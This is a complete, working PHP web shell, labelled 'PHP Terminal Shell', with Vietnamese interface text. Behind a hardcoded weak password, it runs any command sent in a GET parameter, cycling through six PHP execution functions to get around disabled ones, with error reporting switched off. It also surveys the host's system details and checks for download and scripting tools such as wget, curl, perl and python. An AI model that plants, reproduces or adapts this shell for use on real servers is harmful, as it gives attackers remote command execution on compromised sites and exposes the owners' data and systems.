<?php
session_start();
error_reporting(0);
set_time_limit(0);

// 🔐 Mật khẩu truy cập
define('ACCESS_PASSWORD', 'admin123');

// Giao diện nhập mật khẩu
if (!isset($_SESSION['authenticated'])) {
    if (isset($_POST['password']) && $_POST['password'] === ACCESS_PASSWORD) {
        $_SESSION['authenticated'] = true;
        header("Location: ".$_SERVER['PHP_SELF']);
        exit;
    }
    echo '<!DOCTYPE html><html><head><title>Login</title><style>
        body { background:#111; color:#0f0; font-family:monospace; display:flex; align-items:center; justify-content:center; height:100vh; }
        form { text-align:center; }
        input[type=password] { padding:8px; width:250px; background:#222; color:#0f0; border:1px solid #0f0; }
        input[type=submit] { padding:8px 20px; margin-top:10px; background:#0f0; border:none; color:#000; cursor:pointer; }
    </style></head><body>
    <form method="post"><h2>🔐 Nhập mật khẩu:</h2>
    <input type="password" name="password" autofocus><br><input type="submit" value="Vào"></form>
    </body></html>';
    exit;
}

// OS checker
function is_windows() {
    return strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
}

// Chạy lệnh với nhiều method
function run_command($cmd) {
    $output = "";

    if (function_exists('shell_exec')) $output = shell_exec($cmd);
    if (!$output && function_exists('exec')) { exec($cmd, $r); $output = implode("\n", $r); }
    if (!$output && function_exists('system')) { ob_start(); system($cmd); $output = ob_get_clean(); }
    if (!$output && function_exists('passthru')) { ob_start(); passthru($cmd); $output = ob_get_clean(); }
    if (!$output && function_exists('popen')) {
        $fp = popen($cmd, "r");
        if ($fp) { while (!feof($fp)) $output .= fread($fp, 1024); pclose($fp); }
    }
    if (!$output && function_exists('proc_open')) {
        $desc = [[ "pipe", "r" ], [ "pipe", "w" ], [ "pipe", "w" ]];
        $p = proc_open($cmd, $desc, $pipes);
        if (is_resource($p)) {
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]); fclose($pipes[2]);
            proc_close($p);
        }
    }

    return $output ?: "";
}

// Kiểm tra tool
function check_tool($name, $version_cmd = null, $is_extension = false) {
    if ($is_extension) {
        return extension_loaded($name) ? "✅ Có (PHP extension)" : "❌ Không";
    } else {
        $cmd = is_windows() ? "where $name" : "which $name";
        $path = trim(run_command($cmd));
        if ($path) {
            if ($version_cmd) {
                $ver = trim(run_command($version_cmd));
                return "✅ Có ($path) - " . htmlentities($ver);
            }
            return "✅ Có ($path)";
        } else {
            return "❌ Không";
        }
    }
}

// Thông tin hệ thống
function get_system_info() {
    return [
        'OS' => PHP_OS,
        'PHP Version' => PHP_VERSION,
        'Server Software' => $_SERVER['SERVER_SOFTWARE'] ?? 'CLI',
        'Hostname' => gethostname(),
        'User' => get_current_user(),
        'IP Server' => $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname()),
        'Client IP' => $_SERVER['REMOTE_ADDR'] ?? 'CLI',
        'Uptime' => is_windows() ? run_command("net stats srv") : run_command("uptime"),
        'CPU Info' => is_windows() ? run_command("wmic cpu get name") : run_command("lscpu | grep 'Model name'"),
        'RAM' => is_windows() ? run_command("wmic memorychip get capacity") : run_command("free -h"),
        'Disk' => disk_total_space("/") ? round(disk_total_space("/")/1024/1024/1024, 2).' GB' : 'N/A',
        'Current Directory' => getcwd(),
    ];
}

$cmd = $_GET['cmd'] ?? false;
$sysinfo = get_system_info();

// Danh sách tool cần check
$tools = [
    ['Python 2', 'python2 --version'],
    ['Python 3', 'python3 --version'],
    ['Perl', 'perl --version'],
    ['Git', 'git --version'],
    ['Wget', 'wget --version'],
    ['Curl (binary)', 'curl --version'],
    ['Curl (PHP ext)', null, true],
    ['PHP-CLI', 'php -v'],
    ['CGI-bin', null], // Chỉ check thư mục
];
?>
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <title>PHP Web Terminal</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background: #000; color: #0f0; font-family: monospace; }
        .terminal-box { background-color: #111; padding: 20px; border-radius: 10px; border: 1px solid #0f0; min-height: 300px; }
        input.form-control { background: #222; color: #0f0; border: 1px solid #0f0; }
        pre { color: #0f0; background: #111; border: none; padding: 15px; border-radius: 5px; white-space: pre-wrap; }
        table td, table th { color: #0f0; border-color: #0f0; background: #111; }
    </style>
</head>
<body>
<div class="container py-4">
    <h3 class="text-success mb-3">🖥️ PHP Terminal Shell (<?= is_windows() ? 'Windows' : 'Linux' ?>)</h3>

    <!-- Thông tin hệ thống -->
    <div class="mb-4">
        <h5>📊 Thông tin hệ thống:</h5>
        <table class="table table-bordered table-sm">
            <?php foreach ($sysinfo as $k => $v): ?>
                <tr>
                    <th><?= $k ?></th>
                    <td><pre><?= htmlentities(is_array($v) ? implode("\n", $v) : $v) ?></pre></td>
                </tr>
            <?php endforeach; ?>
        </table>
    </div>

    <!-- Kiểm tra công cụ -->
    <div class="mb-4">
        <h5>🔍 Kiểm tra công cụ:</h5>
        <table class="table table-bordered table-sm">
            <tr><th>Công cụ</th><th>Trạng thái</th></tr>
            <?php foreach ($tools as $tool): ?>
                <tr>
                    <td><?= $tool[0] ?></td>
                    <td>
                        <?php
                        if ($tool[0] === 'CGI-bin') {
                            echo is_dir('/usr/lib/cgi-bin') || is_dir('cgi-bin') ? "✅ Có" : "❌ Không";
                        } else {
                            echo check_tool(
                                strtolower(explode(" ", $tool[0])[0]),
                                $tool[1] ?? null,
                                $tool[2] ?? false
                            );
                        }
                        ?>
                    </td>
                </tr>
            <?php endforeach; ?>
        </table>
    </div>

    <!-- Terminal -->
    <div class="terminal-box">
        <form method="get" class="mb-3">
            <label class="form-label">Nhập lệnh:</label>
            <div class="input-group">
                <input type="text" name="cmd" class="form-control" value="<?= htmlentities($cmd) ?>" autofocus autocomplete="off" spellcheck="false">
                <button class="btn btn-success" type="submit">Chạy</button>
            </div>
        </form>
        <?php if ($cmd): ?>
            <h5>📥 Kết quả:</h5>
            <pre><?= htmlentities(run_command($cmd)) ?></pre>
        <?php endif; ?>
    </div>
</div>
</body>
</html>
